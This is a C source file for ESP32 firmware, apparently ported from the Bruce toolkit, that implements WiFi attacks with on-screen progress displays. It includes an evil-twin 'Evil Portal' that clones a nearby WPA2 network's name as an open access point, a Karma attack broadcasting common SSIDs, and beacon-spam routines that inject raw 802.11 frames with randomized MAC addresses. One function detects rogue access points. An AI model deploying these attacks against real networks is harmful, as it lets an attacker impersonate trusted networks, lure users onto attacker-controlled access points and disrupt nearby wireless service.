#include "wifi_attacks_enhanced.h"
#include "wifi_functions.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_random.h"
#include "display.h"
#include "touchscreen.h"
#include "utils.h"
#include <string.h>
#include <stdlib.h>

static const char* TAG = "WIFI_ENHANCED";

// Evil Portal implementation from Bruce
void wifi_evil_portal_attack(void) {
    ESP_LOGI(TAG, "Starting Evil Portal attack");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Evil Portal Attack", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Setting up portal...", COLOR_ORANGE, COLOR_BLACK);
    
    // First scan for target networks
    wifi_scan_config_t scan_config = {.show_hidden = true};
    esp_wifi_scan_start(&scan_config, true);
    
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    
    if (ap_count > 0) {
        wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
        esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        
        // Clone the first WPA2 network found
        for (int i = 0; i < ap_count; i++) {
            if (ap_records[i].authmode == WIFI_AUTH_WPA2_PSK) {
                wifi_config_t evil_config = {
                    .ap = {
                        .channel = ap_records[i].primary,
                        .max_connection = 4,
                        .authmode = WIFI_AUTH_OPEN // Make it open for easier connection
                    }
                };
                
                memcpy(evil_config.ap.ssid, ap_records[i].ssid, 32);
                evil_config.ap.ssid_len = strlen((char*)ap_records[i].ssid);
                
                esp_wifi_set_mode(WIFI_MODE_AP);
                esp_wifi_set_config(WIFI_IF_AP, &evil_config);
                esp_wifi_start();
                
                display_draw_text(10, 60, "Evil twin active!", COLOR_RED, COLOR_BLACK);
                char ssid_info[48];
                snprintf(ssid_info, sizeof(ssid_info), "Cloning: %.20s", (char*)ap_records[i].ssid);
                display_draw_text(10, 80, ssid_info, COLOR_ORANGE, COLOR_BLACK);
                
                // Run for 30 seconds
                for (int sec = 0; sec < 30; sec++) {
                    char time_info[32];
                    snprintf(time_info, sizeof(time_info), "Time: %d/30s", sec + 1);
                    display_fill_rect(10, 100, 200, 20, COLOR_BLACK);
                    display_draw_text(10, 100, time_info, COLOR_GREEN, COLOR_BLACK);
                    vTaskDelay(pdMS_TO_TICKS(1000));
                }
                break;
            }
        }
        free(ap_records);
    }
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    
    display_draw_text(10, 140, "Evil portal stopped", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}

// Karma Attack from Bruce
void wifi_karma_attack(void) {
    ESP_LOGI(TAG, "Starting Karma attack");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Karma Attack", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Responding to probes...", COLOR_RED, COLOR_BLACK);
    
    const char* karma_ssids[] = {
        "linksys", "netgear", "home", "wifi", "guest", 
        "default", "router", "wireless", "internet", "network"
    };
    
    for (int cycle = 0; cycle < 50; cycle++) {
        wifi_config_t karma_config = {
            .ap = {
                .channel = 6,
                .max_connection = 4,
                .authmode = WIFI_AUTH_OPEN
            }
        };
        
        int ssid_idx = cycle % 10;
        strcpy((char*)karma_config.ap.ssid, karma_ssids[ssid_idx]);
        karma_config.ap.ssid_len = strlen(karma_ssids[ssid_idx]);
        
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_config(WIFI_IF_AP, &karma_config);
        esp_wifi_start();
        
        char karma_info[48];
        snprintf(karma_info, sizeof(karma_info), "Broadcasting: %s", karma_ssids[ssid_idx]);
        display_fill_rect(10, 60, 220, 20, COLOR_BLACK);
        display_draw_text(10, 60, karma_info, COLOR_GREEN, COLOR_BLACK);
        
        char progress[32];
        snprintf(progress, sizeof(progress), "Cycle: %d/50", cycle + 1);
        display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
        display_draw_text(10, 80, progress, COLOR_BLUE, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(1000));
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    
    display_draw_text(10, 120, "Karma attack complete!", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}

// Enhanced Beacon Spam with Bruce's funny SSIDs
void wifi_beacon_spam_enhanced(void) {
    ESP_LOGI(TAG, "Starting enhanced beacon spam");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Enhanced Beacon Spam", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Spamming funny SSIDs...", COLOR_RED, COLOR_BLACK);
    
    const char* funny_ssids[] = {
        "Mom Use This One",
        "Abraham Linksys", 
        "Benjamin FrankLAN",
        "Martin Router King",
        "Pretty Fly for a Wi-Fi",
        "Bill Wi the Science Fi",
        "I Believe Wi Can Fi",
        "Tell My Wi-Fi Love Her",
        "FBI Surveillance Van 4",
        "Area 51 Test Site",
        "Wu Tang LAN",
        "Hide Yo Kids Hide Yo WiFi",
        "VIRUS.EXE",
        "Loading...",
        "404 Wi-Fi Unavailable",
        "Drop It Like Its Hotspot",
        "Yell BRUCE for Password",
        "Get Your Own Damn WiFi",
        "It Hurts When IP",
        "Dora the Internet Explorer"
    };
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    // Beacon frame template
    uint8_t beacon_frame[] = {
        0x80, 0x00,                         // Frame Control (Beacon)
        0x00, 0x00,                         // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
        0x64, 0x00,                         // Beacon Interval
        0x01, 0x04,                         // Capability Info
    };
    
    int beacons_sent = 0;
    
    for (int i = 0; i < 200; i++) {
        int ssid_idx = i % 20;
        const char* ssid = funny_ssids[ssid_idx];
        int ssid_len = strlen(ssid);
        
        // Create extended beacon frame with SSID
        uint8_t extended_beacon[128];
        memcpy(extended_beacon, beacon_frame, sizeof(beacon_frame));
        
        // Randomize MAC addresses
        for (int j = 0; j < 6; j++) {
            extended_beacon[10 + j] = esp_random() & 0xFF; // Source
            extended_beacon[16 + j] = esp_random() & 0xFF; // BSSID
        }
        
        // Add SSID element
        int offset = sizeof(beacon_frame);
        extended_beacon[offset] = 0x00;        // SSID element ID
        extended_beacon[offset + 1] = ssid_len; // SSID length
        memcpy(&extended_beacon[offset + 2], ssid, ssid_len);
        
        int total_len = offset + 2 + ssid_len;
        
        // Send beacon frame
        esp_wifi_80211_tx(WIFI_IF_AP, extended_beacon, total_len, false);
        beacons_sent++;
        
        if (i % 10 == 0) {
            char progress[32];
            snprintf(progress, sizeof(progress), "Sent: %d/200", beacons_sent);
            display_fill_rect(10, 60, 200, 20, COLOR_BLACK);
            display_draw_text(10, 60, progress, COLOR_GREEN, COLOR_BLACK);
            
            char current_ssid[48];
            snprintf(current_ssid, sizeof(current_ssid), "SSID: %.25s", ssid);
            display_fill_rect(10, 80, 220, 20, COLOR_BLACK);
            display_draw_text(10, 80, current_ssid, COLOR_ORANGE, COLOR_BLACK);
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    
    display_draw_text(10, 120, "Enhanced spam complete!", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}

// Pineapple Detector from Bruce
void wifi_pineapple_detector(void) {
    ESP_LOGI(TAG, "Starting Pineapple detector");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Pineapple Detector", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Scanning for rogue APs...", COLOR_ORANGE, COLOR_BLACK);
    
    // Suspicious OUI prefixes
    const uint8_t suspicious_ouis[][3] = {
        {0x00, 0x13, 0x37}, // Hak5 OUI
        {0x00, 0xC0, 0xCA}, // Alfa Networks
        {0x02, 0x00, 0x00}  // Locally administered
    };
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };
    
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
    
    uint16_t ap_count = 0;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
    
    if (ap_count > 0) {
        wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
        if (ap_records) {
            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_records));
            
            int suspicious_count = 0;
            int y_pos = 60;
            
            for (int i = 0; i < ap_count && y_pos < 250; i++) {
                bool is_suspicious = false;
                
                // Check for suspicious OUIs
                for (int j = 0; j < 3; j++) {
                    if (memcmp(ap_records[i].bssid, suspicious_ouis[j], 3) == 0) {
                        is_suspicious = true;
                        break;
                    }
                }
                
                // Check for suspicious SSIDs
                if (!is_suspicious) {
                    const char* suspicious_ssids[] = {"Pineapple", "Free WiFi", "attwifi", "xfinitywifi"};
                    for (int j = 0; j < 4; j++) {
                        if (strstr((char*)ap_records[i].ssid, suspicious_ssids[j]) != NULL) {
                            is_suspicious = true;
                            break;
                        }
                    }
                }
                
                if (is_suspicious) {
                    suspicious_count++;
                    char ap_info[64];
                    snprintf(ap_info, sizeof(ap_info), "SUSP: %.20s", (char*)ap_records[i].ssid);
                    display_draw_text(10, y_pos, ap_info, COLOR_RED, COLOR_BLACK);
                    y_pos += 15;
                }
            }
            
            char result[48];
            snprintf(result, sizeof(result), "Found %d suspicious APs", suspicious_count);
            display_draw_text(10, 220, result, suspicious_count > 0 ? COLOR_RED : COLOR_GREEN, COLOR_BLACK);
            
            free(ap_records);
        }
    }
    
    wait_for_back_button();
}

// Rickroll Attack from Bruce
void wifi_rickroll_attack(void) {
    ESP_LOGI(TAG, "Starting Rickroll attack");
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Rickroll Attack", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 40, "Never gonna give you up!", COLOR_RED, COLOR_BLACK);
    
    const char* rickroll_ssids[] = {
        "01 Never gonna give you up",
        "02 Never gonna let you down", 
        "03 Never gonna run around",
        "04 and desert you",
        "05 Never gonna make you cry",
        "06 Never gonna say goodbye",
        "07 Never gonna tell a lie",
        "08 and hurt you"
    };
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    uint8_t beacon_frame[] = {
        0x80, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x01, 0x04
    };
    
    for (int cycle = 0; cycle < 10; cycle++) {
        for (int i = 0; i < 8; i++) {
            const char* ssid = rickroll_ssids[i];
            int ssid_len = strlen(ssid);
            
            uint8_t extended_beacon[128];
            memcpy(extended_beacon, beacon_frame, sizeof(beacon_frame));
            
            // Randomize BSSID
            for (int j = 0; j < 6; j++) {
                extended_beacon[10 + j] = esp_random() & 0xFF;
                extended_beacon[16 + j] = esp_random() & 0xFF;
            }
            
            int offset = sizeof(beacon_frame);
            extended_beacon[offset] = 0x00;
            extended_beacon[offset + 1] = ssid_len;
            memcpy(&extended_beacon[offset + 2], ssid, ssid_len);
            
            esp_wifi_80211_tx(WIFI_IF_AP, extended_beacon, offset + 2 + ssid_len, false);
            
            char line_info[48];
            snprintf(line_info, sizeof(line_info), "Line %d: %.25s", i + 1, ssid);
            display_fill_rect(10, 60, 220, 20, COLOR_BLACK);
            display_draw_text(10, 60, line_info, COLOR_ORANGE, COLOR_BLACK);
            
            char cycle_info[32];
            snprintf(cycle_info, sizeof(cycle_info), "Cycle: %d/10", cycle + 1);
            display_fill_rect(10, 80, 200, 20, COLOR_BLACK);
            display_draw_text(10, 80, cycle_info, COLOR_GREEN, COLOR_BLACK);
            
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
    }
    
    esp_wifi_set_promiscuous(false);
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    
    display_draw_text(10, 120, "You've been rickrolled!", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}